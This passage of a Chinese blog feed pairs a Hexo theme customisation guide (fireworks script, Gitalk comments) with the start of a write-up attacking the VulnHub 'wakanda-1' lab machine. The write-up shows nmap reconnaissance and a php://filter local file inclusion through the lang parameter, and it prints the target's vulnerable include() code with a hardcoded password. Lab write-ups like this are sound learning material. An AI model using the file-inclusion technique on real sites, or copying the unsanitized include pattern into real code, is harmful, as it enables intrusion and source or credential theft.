function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在/layout/layout.ejs中写入：</p><pre class=" language-html"><code class="language-html">{% if theme.fireworks %}>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fireworks<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/animejs/2.2.0/anime.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/src/fireworks.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>> {% endif %}</code></pre><p>然后，在相应主题的config文件加入</p><pre class=" language-shell"><code class="language-shell">fireworks: true</code></pre></blockquote><h2 id="9-设置评论功能Gitment"><a href="#9-设置评论功能Gitment" class="headerlink" title="9.设置评论功能Gitment"></a>9.设置评论功能Gitment</h2><blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb852eb79447.png" class="lazyload"></p><p>owner github用户名，repo存储评论的仓库，clientId和clientSecret需要自己注册github app</p><p><a href="https://github.com/settings/applications" target="_blank" rel="noopener">https://github.com/settings/applications</a></p><p>切记Authorization callback URL 要填写CNAME解析的域名（未解析则填默认github的域名），否则可能无法使用</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb8533843b56.png" class="lazyload"></p><p>然后凄惨地发现作者服务停止了，参考<a href="https://www.jianshu.com/p/f2f4c802914b" target="_blank" rel="noopener">https://www.jianshu.com/p/f2f4c802914b</a></p></blockquote><h2 id="10-添加目录"><a href="#10-添加目录" class="headerlink" title="10.添加目录"></a>10.添加目录</h2><blockquote><p>在主题的模板文件，找到文章内容模板，将其插入在内容前面即可。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>%- toc<span class="token punctuation">(</span>page.content, <span class="token punctuation">{</span>        class: <span class="token string">'post-toc'</span>,        list_number: <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span> %<span class="token operator">></span></code></pre></blockquote><h2 id="11-添加Gitalk"><a href="#11-添加Gitalk" class="headerlink" title="11.添加Gitalk"></a>11.添加Gitalk</h2><blockquote><p>已经集成了Gitalk的主题按如下配置即可：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc2cd32b93d9.png" class="lazyload"></p><p>owner就是用户名，repo是仓库名，至于clientID，clientSecret，需要自行申请创建 OAuth applications。评论需要涉及 GitHub 授权登录，所以在这里你先要有一个 GitHub application。GitHub 授权登录遵循 <a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">OAuth 2.0 标准</a>。OAuth applications 创建如下图所示，填写上面相应的内容。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc2ceac7ef32.png" class="lazyload"></p></blockquote><h2 id="Gitalk-报错-redirect问题"><a href="#Gitalk-报错-redirect问题" class="headerlink" title="Gitalk 报错 redirect问题"></a>Gitalk 报错 redirect问题</h2><blockquote><p>由于之前写的authorization callback url 为http协议开头，然后又开启了github强制https选项，于是会报错，跳转到首页，并且无法初始化问题，这个时候只需要把 authorization callback url 改成https协议即可.</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc418107dc99.png" class="lazyload"></p></blockquote><blockquote><p> 继续更新中。。。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git账户 </tag>
            
            <tag> Hexo搭建 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wakanda-1-靶机渗透</title>
      <link href="/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="对wakanda靶机的渗透之旅"><a href="#对wakanda靶机的渗透之旅" class="headerlink" title="-对wakanda靶机的渗透之旅"></a>-对wakanda靶机的渗透之旅</h1><p>​    从vulhub上下载靶机后，本打算在vm上搭建，后发现ova导入有点问题，故在virtualbox上搭建成功，我们需要获得flag1.txt,flag2.txt,root.txt 三个文件的信息，将攻击机，靶机均设为桥接网卡模式，因为我的kali是在vm里面。</p><p>​    靶机下载地址:<a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2 id="0x00-渗透过程"><a href="#0x00-渗透过程" class="headerlink" title="0x00 渗透过程"></a>0x00 渗透过程</h2><h3 id="1-对靶机的信息收集"><a href="#1-对靶机的信息收集" class="headerlink" title="1.对靶机的信息收集"></a>1.对靶机的信息收集</h3><p>攻击机：</p><pre><code>自用kali--IP地址:192.168.1.107</code></pre><p>kali netdiscover 启动:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p><p>​    那么可以得到靶机 IP ：192.168.1.108 ，既然得到了靶机ip地址，那么拿出nmap神器对其进行一波扫描，获得更详细的靶机信息。</p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.1.108</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89ecba4d21.png" alt=""></p><p>​    由nmap扫描得出的信息，开启了80端口的web服务，然后是3333端口的一个Openssh服务，这里需要做一下笔记，ssh连接是3333端口而不是常规的22端口哦！先去80端口访问一下看看情况：</p><p><img src="https://i.loli.net/2018/10/06/5bb89ed45deb8.png" alt=""></p><p>​    emmm,发现就一个普通页面啥也没有，只有一个看似有用的 Made by@mamadou ???难道是个用户名还是个密码啥的？先做笔记记一下，萌新就是什么都要做笔记，接下来扫一下目录看看:</p><p><img src="https://i.loli.net/2018/10/06/5bb89edbcd18b.png" alt=""></p><p>​    扫到几个页面，但是貌似SIZE都是0，被CTF各种虐的我还是选择去看看页面里有没有东西。==&gt;转了一圈发现确实是空的，那咋办，难道渗透之旅到此结束？仔细想了几分钟，既然只有一个页面，忘记看源码了，源码如下:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ee81c834.png" alt=""></p><p>​    这绿的我发慌的一串注释，不用直觉我猜也是靶机的切入点了，lang参数改变会影响页面的语言显示，猜测可能是 lang参数改变了使用的语言php文件，那么就是和文件相关的漏洞咯！</p><p>​    但是只有这一个页面，应该可以检测一下这个参数是否可以进行本地文件包含(Local File Include)，将这唯一的一个页面的完整源码给读下来。利用之前做ctf还算有一点点的经验（参考<a href="https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用</a> php://filter 这个协议的一些小特性来将源码以base64的形式down下来:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89ef3e3358.png" class="lazyload"></p><p>​    然后base64解码得到如下完整的源码：</p><pre><code>&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET[&#39;lang&#39;])){include($_GET[&#39;lang&#39;].&quot;.php&quot;);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;meta 